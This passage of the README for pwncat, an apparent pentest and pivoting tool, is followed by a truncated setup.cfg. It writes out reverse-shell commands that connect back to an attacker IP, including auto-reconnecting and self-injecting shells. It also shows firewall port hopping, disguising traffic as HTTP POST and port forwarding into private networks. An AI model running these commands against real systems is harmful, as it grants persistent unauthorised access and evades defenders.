<kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.\nTo fix this, you'll need to attach it to a TTY (make it interactive). Here's how:\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n<kbd>Ctrl</kbd>+<kbd>z</kbd>\n```bash\n# get your current terminal size (rows and columns)\nstty size\n\n# for bash/sh (enter raw mode and disable echo'ing)\nstty raw -echo\nfg\n\n# for zsh (enter raw mode and disable echo'ing)\nstty raw -echo; fg\n\nreset\nexport SHELL=bash\nexport TERM=xterm\nstty rows <num> columns <cols>   # <num> and <cols> values found above by 'stty size'\n```\n> <sup>[1] [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)</sup>\n\n\n### UDP reverse shell\nWithout tricks a UDP reverse shell is not really possible. UDP is a stateless protocol compared to TCP and does not have a `connect()` method as TCP does.\nIn TCP mode, the server will know the client IP and port, once the client issues a `connects()`.\nIn UDP mode, as there is no `connect()`, the client simply sends data to an address/port without having to connect first.\nTherefore, in UDP mode, the server will not be able to know the IP and port of the client and hence, cannot send data to it first.\nThe only way to make this possible is to have the client send some sort of data to the server first, so that the server can see what IP/port has sent data to it.\n\n`pwncat` emulates the TCP `connect()` by having the client send a null byte to the server once or periodically via `--ping-intvl` or `--ping-init`.\n\n```bash\n# The client\n# --exec            # Provide this executable\n# --udp             # Use UDP mode\n# --ping-init       # Send an initial null byte to the server\npwncat --exec /bin/bash --udp --ping-init 10.0.0.1 4444\n```\n\n\n### Unbreakable TCP reverse shell\nWhy unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.\nIn other words, the client will keep trying to connect to the specified server until success. If the connection is interrupted, it will keep trying again.\n```bash\n# The client\n# --exec            # Provide this executable\n# --nodns           # Keep the noise down and don't resolve hostnames\n# -reconn          # Automatically reconnect back to you indefinitely\n# --reconn-wait     # If connection is lost, connect back to you every 2 seconds\n\npwncat --exec /bin/bash --nodns --reconn --reconn-wait 2 10.0.0.1 4444\n```\n\n### Unbreakable UDP reverse shell\nWhy unbreakable? Because it will keep coming back to you, even if you kill your listening server temporarily.\nIn other words, the client will keep sending null bytes to the server to constantly announce itself.\n```bash\n# The client\n# --exec            # Provide this executable\n# --nodns           # Keep the noise down and don't resolve hostnames\n# --udp             # Use UDP mode\n# --ping-intvl      # Ping the server every 2 seconds\n\npwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444\n```\n\n### Self-injecting reverse shell\n\nLet's imagine you are able to create a very simple and unstable reverse shell from the target to\nyour machine, such as a web shell via a PHP script or similar.\nKnowing, that this will not persist very long or might break due to unstable network connection,\nyou could use `pwncat` to hook into this connection and deploy itself unbreakably on the target - fully automated.\n\n<a href=\"https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s\"><img width=\"400\" style=\"width:400px;\" src=\"docs/img/video01.png\" /></a>\n\n> [View on Youtube](https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s)\n\nAll you have to do, is use `pwncat` as your local listener and start it with the `--self-inject`\nswitch. As soon as the client (e.g.: the reverse web shell) connects to it, it will do a couple of things:\n\n1. Enumerate Python availability and versions on the target\n2. Dump itself base64 encoded onto the target\n3. Use the target's Python to decode itself.\n4. Use the target's Python to start itself as an unbreakable reverse shell back to you\n\nOnce this is done, you can keep using the current connection or simply abandon it and start a new\nlistener (yes, you don't need to start the listener before starting the reverse shell) to have\nthe new `pwncat` client connect to you. The new listener also doesn't have to be `pwncat`, it can\nalso be `netcat` or `ncat`.\n\nThe **`--self-inject`** switch:\n```bash\npwncat -l 4444 --self-inject <cmd>:<host>:<port>\n```\n\n* `<cmd>`: This is the command to start on the target (like `-e`/`--exec`, so you want it to be `cmd.exe` or `/bin/bash`)\n* `<host>`: This is for your local machine, the IP address to where the reverse shell shall connect back to\n* `<port>`: This is for your local machine, the port on which the reverse shell shall connect back to\n\nSo imagine your Kali machine is 10.0.0.1. You instruct your webshell that you inject onto a Linux server to connect to you at port `4444`:\n```bash\n# Start this locally, before starting the reverse webshell\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445\n```\nYou will then see something like this:\n```\n[PWNCAT CnC] Probing for: /bin/python\n[PWNCAT CnC] Probing for: /bin/python2\n[PWNCAT CnC] Probing for: /bin/python2.7\n[PWNCAT CnC] Probing for: /bin/python3\n[PWNCAT CnC] Probing for: /bin/python3.5\n[PWNCAT CnC] Probing for: /bin/python3.6\n[PWNCAT CnC] Probing for: /bin/python3.7\n[PWNCAT CnC] Probing for: /bin/python3.8\n[PWNCAT CnC] Probing for: /usr/bin/python\n[PWNCAT CnC] Potential path: /usr/bin/python\n[PWNCAT CnC] Found valid Python2 version: 2.7.16\n[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us\n[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT\n[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)\n[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &\n```\nAnd you are set. You can now start another listener locally at `4445` (again, it will connect back to you endlessly, so it is not required to start the listener first).\n```bash\n# either netcat\nnc -lp 4445\n# or ncat\nncat -l 4445\n# or pwncat\npwncat -l 4445\n```\n\n### Unlimited self-injecting reverse shells\n\nInstead of just asking for a single self-injecting reverse shell, you can instruct `pwncat` to spawn as many unbreakable reverse shells connecting back to you as you desire.\n\n<a href=\"https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\"><img width=\"400\" style=\"width:400px;\" src=\"docs/img/video02.png\" /></a>\n\n> [View on Youtube](https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2\")\n\nThe `--self-inject` argument allows you to not only define a single port, but also\n\n1. A comma separated list of ports: `4445,4446,4447,4448`\n2. A range definition: `4446-4448`\n3. An increment: `4445+3`\n\nIn order to spawn 4 reverse shells you would start your listener just as described above, but instead\nof a single port, you define multiple:\n\n```bash\n# Comma separated\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445,4446,4447,4448\n\n# Range\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445-4448\n\n# Increment\npwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3\n```\nEach of the above three commands will achieve the same behaviour: spawning 4 reverse shells inside the target.\nOnce the client connects, the output will look something like this:\n\n```\n[PWNCAT CnC] Probing for: /bin/python\n[PWNCAT CnC] Probing for: /bin/python2\n[PWNCAT CnC] Probing for: /bin/python2.7\n[PWNCAT CnC] Probing for: /bin/python3\n[PWNCAT CnC] Probing for: /bin/python3.5\n[PWNCAT CnC] Probing for: /bin/python3.6\n[PWNCAT CnC] Probing for: /bin/python3.7\n[PWNCAT CnC] Probing for: /bin/python3.8\n[PWNCAT CnC] Probing for: /usr/bin/python\n[PWNCAT CnC] Potential path: /usr/bin/python\n[PWNCAT CnC] Found valid Python2 version: 2.7.16\n[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us\n[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT\n[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)\n[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4446 &\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4447 &\nStarting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4448 &\n```\n\n### Logging\n\n> **Note:** Ensure you have a reverse shell that keeps coming back to you. This way you can always change your logging settings without loosing the shell.\n\n#### Log level and redirection\n\nIf you feel like, you can start a listener in full TRACE logging mode to figure out what's going on or simply to troubleshoot.\nLog message are colored depending on their severity. Colors are automatically turned off, if stderr is not a pty, e.g.: if piping those to a file.\nYou can also manually disable colored logging for terminal outputs via the `--color` switch.\n```bash\npwncat -vvvv -l 4444\n```\nYou will see (among all the gibberish) a TRACE message:\n```bash\n2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'\n2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\\x1b[32m[0]\\x1b[0m\\r\\r\\n'\n2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\\x1b[32m[0]\\x1b[0m\\r\\r\\n'\n2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744\n2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\\x1b[32m[0]\\x1b[0m\\r\\r\\n'\n2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)\n2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output\n```\n\nAs soon as you saw this on the listener, you can issue commands to the client.\nAll the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate\nyour server and start it again in silent mode:\n```bash\npwncat -l 4444\n```\nNow wait a maximum a few seconds, depending at what interval the client comes back to you and voila, your session is now again without logs.\n\nHaving no info messages at all, is also sometimes not desirable. You might want to know what is going\non behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect\nthe notifications to a logfile:\n```bash\npwncat -l -vvv 4444 2> comm.txt\n```\nNow all you'll see in your terminal session are the actual command inputs and outputs.\nIf you want to see what's going on behind the scene, open a second terminal window and tail\nthe `comm.txt` file:\n```bash\n# View communication info\ntail -fn50 comm.txt\n\n2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'\n2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\\x1b[32m[0]\\x1b[0m\\r\\r\\n'\n2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\\x1b[32m[0]\\x1b[0m\\r\\r\\n'\n2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744\n2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\\x1b[32m[0]\\x1b[0m\\r\\r\\n'\n2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)\n2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output\n```\n\n#### Socket information\n\nAnother useful feature is to display currently configured socket and network settings.\nUse the `--info` switch with either `socket`, `ipv4`, `ipv6`, `tcp` or `all` to display all\navailable settings.\n\n**Note:** In order to view those settings, you must at least be at `INFO` log level (`-vv`).\n\nAn example output in IPv4/TCP mode without any custom settings is shown below:\n```\nINFO: [bind-sock] Sock: SO_DEBUG: 0\nINFO: [bind-sock] Sock: SO_ACCEPTCONN: 1\nINFO: [bind-sock] Sock: SO_REUSEADDR: 1\nINFO: [bind-sock] Sock: SO_KEEPALIVE: 0\nINFO: [bind-sock] Sock: SO_DONTROUTE: 0\nINFO: [bind-sock] Sock: SO_BROADCAST: 0\nINFO: [bind-sock] Sock: SO_LINGER: 0\nINFO: [bind-sock] Sock: SO_OOBINLINE: 0\nINFO: [bind-sock] Sock: SO_REUSEPORT: 0\nINFO: [bind-sock] Sock: SO_SNDBUF: 16384\nINFO: [bind-sock] Sock: SO_RCVBUF: 131072\nINFO: [bind-sock] Sock: SO_SNDLOWAT: 1\nINFO: [bind-sock] Sock: SO_RCVLOWAT: 1\nINFO: [bind-sock] Sock: SO_SNDTIMEO: 0\nINFO: [bind-sock] Sock: SO_RCVTIMEO: 0\nINFO: [bind-sock] Sock: SO_ERROR: 0\nINFO: [bind-sock] Sock: SO_TYPE: 1\nINFO: [bind-sock] Sock: SO_PASSCRED: 0\nINFO: [bind-sock] Sock: SO_PEERCRED: 0\nINFO: [bind-sock] Sock: SO_BINDTODEVICE: 0\nINFO: [bind-sock] Sock: SO_PRIORITY: 0\nINFO: [bind-sock] Sock: SO_MARK: 0\nINFO: [bind-sock] IPv4: IP_OPTIONS: 0\nINFO: [bind-sock] IPv4: IP_HDRINCL: 0\nINFO: [bind-sock] IPv4: IP_TOS: 0\nINFO: [bind-sock] IPv4: IP_TTL: 64\nINFO: [bind-sock] IPv4: IP_RECVOPTS: 0\nINFO: [bind-sock] IPv4: IP_RECVRETOPTS: 0\nINFO: [bind-sock] IPv4: IP_RETOPTS: 0\nINFO: [bind-sock] IPv4: IP_MULTICAST_IF: 0\nINFO: [bind-sock] IPv4: IP_MULTICAST_TTL: 1\nINFO: [bind-sock] IPv4: IP_MULTICAST_LOOP: 1\nINFO: [bind-sock] IPv4: IP_DEFAULT_MULTICAST_TTL: 0\nINFO: [bind-sock] IPv4: IP_DEFAULT_MULTICAST_LOOP: 0\nINFO: [bind-sock] IPv4: IP_MAX_MEMBERSHIPS: 0\nINFO: [bind-sock] IPv4: IP_TRANSPARENT: 0\nINFO: [bind-sock] TCP: TCP_NODELAY: 0\nINFO: [bind-sock] TCP: TCP_MAXSEG: 536\nINFO: [bind-sock] TCP: TCP_CORK: 0\nINFO: [bind-sock] TCP: TCP_KEEPIDLE: 7200\nINFO: [bind-sock] TCP: TCP_KEEPINTVL: 75\nINFO: [bind-sock] TCP: TCP_KEEPCNT: 9\nINFO: [bind-sock] TCP: TCP_SYNCNT: 6\nINFO: [bind-sock] TCP: TCP_LINGER2: 60\nINFO: [bind-sock] TCP: TCP_DEFER_ACCEPT: 0\nINFO: [bind-sock] TCP: TCP_WINDOW_CLAMP: 0\nINFO: [bind-sock] TCP: TCP_INFO: 10\nINFO: [bind-sock] TCP: TCP_QUICKACK: 1\nINFO: [bind-sock] TCP: TCP_FASTOPEN: 0\n```\n\n\n<!--\n</details>\n-->\n\n### Port forwarding magic\n\n<!--\n<details>\n  <summary>Click to expand</summary>\n-->\n\n#### Local TCP port forwarding\n\n**Scenario**\n1. Alice can be reached from the Outside (TCP/UDP)\n2. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     TCP     +-----------------+     TCP     +-----------------+\n     | The cat         | -----|----> | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat 72.0.0.1 3306     |      pwncat \\                 |\n                              |        -L 72.0.0.1:3306 \\     |\n                              |         10.0.0.1 3306         |\n```\n\n#### Local UDP port forwarding\n\n**Scenario**\n1. Alice can be reached from the Outside (but only via UDP)\n2. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     UDP     +-----------------+     TCP     +-----------------+\n     | The cat         | -----|----> | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat -L       |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -u 72.0.0.1 3306  |      pwncat -u \\              |\n                              |        -L 72.0.0.1:3306 \\     |\n                              |        10.0.0.1 3306          |\n```\n\n#### Remote TCP port forward\n\n**Scenario**\n1. Alice cannot be reached from the Outside\n2. Alice is allowed to connect to the Outside (TCP/UDP)\n3. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     TCP     +-----------------+     TCP     +-----------------+\n     | The cat         | <----|----- | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -l 4444           |      pwncat --reconn \\        |\n                              |        -R 56.0.0.1:4444 \\     |\n                              |        10.0.0.1 3306          |\n```\n\n#### Remote UDP port forward\n\n**Scenario**\n1. Alice cannot be reached from the Outside\n2. Alice is allowed to connect to the Outside (UDP: DNS only)\n3. Bob can only be reached from Alice's machine\n```\n                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     UDP     +-----------------+     TCP     +-----------------+\n     | The cat         | <----|----- | Alice           | -----|----> | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -u -l 53          |      pwncat -u --reconn \\     |\n                              |        -R 56.0.0.1:4444 \\     |\n                              |        10.0.0.1 3306          |\n```\n<!--\n</details>\n-->\n\n\n### Outbound port hopping\n\nIf you have no idea what outbound ports are allowed from the target machine, you can instruct\nthe client (e.g.: in case of a reverse shell) to probe outbound ports endlessly.\n\n```bash\n# Reverse shell on target (the client)\n# --exec            # The command shell the client should provide\n# --reconn          # Instruct it to reconnect endlessly\n# --reconn-wait     # Reconnect every 0.1 seconds\n# --reconn-robin    # Use these ports to probe for outbount connections\n\npwncat --exec /bin/bash --reconn --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53\n```\n\nOnce the client is up and running, either use raw sockets to check for inbound traffic or use\nsomething like Wireshark or tcpdump to find out from where the client is able to connect back to you,\n\nIf you found one or more ports that the client is able to connect to you,\nsimply start your listener locally and wait for it to come back.\n```bash\npwncat -l <ip> <port>\n```\nIf the client connects to you, you will have a working reverse shell. If you stop your local\nlistening server accidentally or on purpose, the client will probe ports again until it connects successfully.\nIn order to kill the reverse shell client, you can use `--safe-word` (when starting the client).\n\n\nIf none of this succeeds, you can add other measures such as using UDP or even wrapping your\npackets into higher level protocols, such as HTTP or others. See [PSE](pse) or examples below\nfor how to transform your traffic.\n\n\n### Pwncat Scripting Engine ([PSE](pse))\n\n`pwncat` offers a Python based scripting engine to inject your custom code before sending and\nafter receiving data.\n\n#### How it works\n\nYou will simply need to provide a Python file with the following entrypoint function:\n```python\ndef transform(data, pse):\n    # Example to reverse a string\n    return data[::-1]\n```\nBoth, the function name must be named `transform` and the parsed arguments must be named `data` and `pse`.\nOther than that you can add as much code as you like. Each instance of `pwncat` can take two scripts:\n\n1. `--script-send`: script will be applied before sending\n2. `--script-recv`: script will be applied after receiving\n\nSee [here](pse) for API and more details\n\n\n#### Example 1: Self-built asymmetric encryption\n\n> PSE: [asym-enc](pse/asym-enc) source code\n\nThis will encrypt your traffic asymmetrically. It is just a very basic [ROT13](https://en.wikipedia.org/wiki/ROT13) implementation with different shift lengths on both sides to *emulate* asymmetry. You could do the same and implement GPG based asymmetric encryption for PSE.\n\n```bash\n# server\npwncat -vvvv -l localhost 4444 \\\n  --script-send pse/asym-enc/pse-asym_enc-server_send.py \\\n  --script-recv pse/asym-enc/pse-asym_enc-server_recv.py\n```\n```bash\n# client\npwncat -vvvv localhost 4444 \\\n  --script-send pse/asym-enc/pse-asym_enc-client_send.py \\\n  --script-recv pse/asym-enc/pse-asym_enc-client_recv.py\n```\n\n#### Example 2: Self-built HTTP POST wrapper\n\n> PSE: [http-post](pse/http-post) source code\n\nThis will wrap all traffic into a valid HTTP POST request, making it look like normal HTTP traffic.\n\n```bash\n# server\npwncat -vvvv -l localhost 4444 \\\n  --script-send pse/http-post/pse-http_post-pack.py \\\n  --script-recv pse/http-post/pse-http_post-unpack.py\n```\n```bash\n# client\npwncat -vvvv localhost 4444 \\\n  --script-send pse/http-post/pse-http_post-pack.py \\\n  --script-recv pse/http-post/pse-http_post-unpack.py\n```\n\n### Port scanning\n\n#### TCP\n```bash\n$ sudo netstat -tlpn\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address     State\ntcp        0      0 127.0.0.1:631           0.0.0.0:*           LISTEN\ntcp        0      0 127.0.0.1:25            0.0.0.0:*           LISTEN\ntcp        0      0 127.0.0.1:4444          0.0.0.0:*           LISTEN\ntcp        0      0 0.0.0.0:902             0.0.0.0:*           LISTEN\ntcp6       0      0 ::1:631                 :::*                LISTEN\ntcp6       0      0 ::1:25                  :::*                LISTEN\ntcp6       0      0 ::1:4444                :::*                LISTEN\ntcp6       0      0 :::1053                 :::*                LISTEN\ntcp6       0      0 :::902                  :::*                LISTEN\n```\n\n#### UDP\nThe following UDP ports are exposing:\n```bash\n$ sudo netstat -ulpn\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address\nudp        0      0 0.0.0.0:631             0.0.0.0:*\nudp        0      0 0.0.0.0:5353            0.0.0.0:*\nudp        0      0 0.0.0.0:39856           0.0.0.0:*\nudp        0      0 0.0.0.0:68              0.0.0.0:*\nudp        0      0 0.0.0.0:68              0.0.0.0:*\nudp6       0      0 :::1053                 :::*\nudp6       0      0 :::5353                 :::*\nudp6       0      0 :::57728                :::*\n```\n\n##### nmap\n```bash\n$ time sudo nmap -T5 localhost --version-intensity 0 -p- -sU\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-05-24 17:03 CEST\nWarning: 127.0.0.1 giving up on port because retransmission cap hit (2).\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000035s latency).\nOther addresses for localhost (not scanned): ::1\nNot shown: 65529 closed ports\nPORT      STATE         SERVICE\n68/udp    open|filtered dhcpc\n631/udp   open|filtered ipp\n1053/udp  open|filtered remote-as\n5353/udp  open|filtered zeroconf\n39856/udp open|filtered unknown\n40488/udp open|filtered unknown\n\nNmap done: 1 IP address (1 host up) scanned in 179.15 seconds\n\nreal    2m52.446s\nuser    0m0.844s\nsys     0m2.571s\n```\n##### netcat\n```bash\n$ time nc  -z localhost 1-65535  -u -4 -v\nConnection to localhost 68 port [udp/bootpc] succeeded!\nConnection to localhost 631 port [udp/ipp] succeeded!\nConnection to localhost 1053 port [udp/*] succeeded!\nConnection to localhost 5353 port [udp/mdns] succeeded!\nConnection to localhost 39856 port [udp/*] succeeded!\n\nreal    0m18.734s\nuser    0m1.004s\nsys     0m2.634s\n```\n##### pwncat\n```bash\n$ time pwncat -z localhost 1-65535 -u -4\nScanning 65535 ports\n[+]    68/UDP open   (IPv4)\n[+]   631/UDP open   (IPv4)\n[+]  1053/UDP open   (IPv4)\n[+]  5353/UDP open   (IPv4)\n[+] 39856/UDP open   (IPv4)\n\nreal    0m7.309s\nuser    0m6.465s\nsys     0m4.794s\n```\n\n\n## :information_source: FAQ\n\n**See complete FAQ here:** https://docs.pwncat.org/en/latest/faq.html\n\n**Q**: Is `pwncat` compatible with `netcat`?\n\n**A**: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.\nYou can even mix `pwncat` with `netcat`, `ncat` or similar tools.\n\n\n**Q**: Does it work on X?\n\n**A**: In its current state it works with Python 2, 3 pypy2 and pypy3 and is fully tested on Linux and MacOS. Windows support is available, but is considered experimental (see [integration tests](https://github.com/cytopia/pwncat/actions)).\n\n\n**Q**: I found a bug / I have to suggest a new feature! What can I do?\n\n**A**: For bug reports or enhancements, please open an issue [here](https://github.com/cytopia/pwncat/issues).\n\n\n**Q**: How can I support this project?\n\n**A**: Thanks for asking! First of all, star this project to give me some feedback and see [CONTRIBUTING.md](CONTRIBUTING.md) for details.\n\n\n## :sunrise: Artwork\n\n<table>\n <thead>\n  <tr>\n   <th>Type</th>\n   <th>Artist</th>\n   <th>Image</th>\n   <th>License</th>\n  </tr>\n </thead>\n <tbody>\n  <tr>\n   <td>Logo</td>\n   <td><a href=\"https://github.com/maifz\">maifz</a></td>\n   <td><a href=\"art/logo.png\"><img src=\"art/logo.png\" style=\"height:128px;\" height=\"128\" alt=\"pwncat logo\" title=\"pwncat logo\" /></a></td>\n   <td><a href=\"https://creativecommons.org/licenses/by-sa/4.0/\"><img src=\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\" /></a></td>\n  </tr>\n  <tr>\n   <td>Banner 1</td>\n   <td><a href=\"https://github.com/maifz\">maifz</a></td>\n   <td><a href=\"art/banner-1.png\"><img src=\"art/banner-1.png\" style=\"height:128px;\" height=\"128\" alt=\"pwncat banner\" title=\"pwncat banner\"  /></a></td>\n   <td><a href=\"https://creativecommons.org/licenses/by-sa/4.0/\"><img src=\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\" /></a></td>\n  </tr>\n  <tr>\n   <td>Banner 2</td>\n   <td><a href=\"https://github.com/maifz\">maifz</a></td>\n   <td><a href=\"art/banner-2.png\"><img src=\"art/banner-2.png\" style=\"height:128px;\" height=\"128\" alt=\"pwncat banner\" title=\"pwncat banner\" /></a></td>\n   <td><a href=\"https://creativecommons.org/licenses/by-sa/4.0/\"><img src=\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\" /></a></td>\n  </tr>\n </tbody>\n</table>\n\n\n## :lock: [cytopia](https://github.com/cytopia) sec tools\n\nBelow is a list of sec tools and docs I am maintaining.\n\n| Name                 | Category             | Language   | Description |\n|----------------------|----------------------|------------|-------------|\n| **[offsec]**         | Documentation        | Markdown   | Offsec checklist, tools and examples |\n| **[header-fuzz]**    | Enumeration          | Bash       | Fuzz HTTP headers |\n| **[smtp-user-enum]** | Enumeration          | Python 2+3 | SMTP users enumerator |\n| **[urlbuster]**      | Enumeration          | Python 2+3 | Mutable web directory fuzzer |\n| **[pwncat]**         | Pivoting             | Python 2+3 | Cross-platform netcat on steroids |\n| **[kusanagi]**       | Payload Generator    | Python 3   | Bind- and Reverse shell payload generator |\n| **[badchars]**       | Reverse Engineering  | Python 2+3 | Badchar generator |\n| **[fuzza]**          | Reverse Engineering  | Python 2+3 | TCP fuzzing tool |\n| **[docker-dvwa]**    | Playground           | PHP        | DVWA with local priv esc challenges |\n\n[offsec]: https://github.com/cytopia/offsec\n[header-fuzz]: https://github.com/cytopia/header-fuzz\n[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum\n[urlbuster]: https://github.com/cytopia/urlbuster\n[pwncat]: https://github.com/cytopia/pwncat\n[kusanagi]: https://github.com/cytopia/kusanagi\n[badchars]: https://github.com/cytopia/badchars\n[fuzza]: https://github.com/cytopia/fuzza\n[docker-dvwa]: https://github.com/cytopia/docker-dvwa\n\n\n## :octocat: Contributing\n\nSee **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.\n\n\n## :exclamation: Disclaimer\n\nThis tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.\n\n\n## :page_facing_up: License\n\n**[MIT License](LICENSE.txt)**\n\nCopyright (c) 2020 **[cytopia](https://github.com/cytopia)**\n"
        },
        {
          "name": "art",
          "type": "tree",
          "content": null
        },
        {
          "name": "bin",
          "type": "tree",
          "content": null
        },
        {
          "name": "docs",
          "type": "tree",
          "content": null
        },
        {
          "name": "man",
          "type": "tree",
          "content": null
        },
        {
          "name": "pse",
          "type": "tree",
          "content": null
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0,
          "content": ""
        },
        {
          "name": "setup.cfg",
          "type": "blob",
          "size": 2.12109375,
          "content": "[metadata]\ndescription-file = README.md\n\n[bdist_wheel]\nuniversal=1\n\n# --------------------------------------------------------------------------------\n# Linter\n# --------------------------------------------------------------------------------\n[pycodestyle]\nmax-line-length = 100\nstatistics = True\nshow-source = True\nshow-pep8 = True\n\n[pydocstyle]\nconvention = google\n# D107: Description is on the class level instead\nadd_ignore = D107\n\n[flake8]\nmax-line-length = 100\n\n[pylint]\n# useless-object-inheritance: don't lint useless-object-inheritance to stary Python2/3 compatible\n# bad-continuation:           let Python Black take care of this\n# unidiomatic-typecheck:      Need to check if int or bool and this doesnt work with isinstance()\ndisable = useless-object-inheritance, bad-continuation, unidiomatic-typecheck, super-with-arguments, raise-missing-from, use-a-generator, consider-using-f-string, consider-using-dict-items, unused-private-member, unspecified-encoding\nmax-branches = 30\nmax-statements = 125\nmax-args = 15\nmax-attributes = 13\nmax-locals = 37\nmax-module-lines = 7000\nmax-bool-expr = 6\nmax-returns = 11\nmin-public-methods = 1\nmax-nested-blocks = 7\n# List of note tags to take in consideration, separated by a comma.\n#notes=FIXME,TODO\nnotes=FIXME\n\n[mypy]\n# Display\nshow_error_context = True\nshow_column_numbers = True\nshow_error_codes = True\npretty = True\ncolor_output = True\nerror_summary = True\n\n# Meta\nwarn_unused_configs = True\nincremental = False\nshow_traceback = True\n\n# Mode\nstrict_optional = True\nshow_none_errors = True\n\n# Allow\ndisallow_any_expr = False\ndisallow_any_explicit = False\ndisallow_any_decorated = False\n\n# Deny\ndisallow_any_unimported = True\ndisallow_any_generics = True\ndisallow_subclassing_any = True\ndisallow_untyped_calls = True\ndisallow_untyped_defs = True\ndisallow_incomplete_defs = 